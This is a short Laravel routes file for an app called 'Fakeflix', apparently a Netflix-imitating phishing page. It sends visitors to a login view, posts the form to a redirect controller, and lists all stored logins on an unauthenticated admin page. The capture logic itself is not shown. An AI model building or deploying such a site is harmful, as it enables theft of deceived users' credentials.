<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\FakeflixController;
use App\Models\Login;

Route::get('/', function () {
    return redirect('/login');
});

Route::get('/login', function () {
    return view('home');
});

Route::get('/admin', function () {
    $logins = Login::all();
    return view('admin', ['logins'=>$logins]);
});

Route::post('/redirect', [FakeflixController::class, 'redirect']);

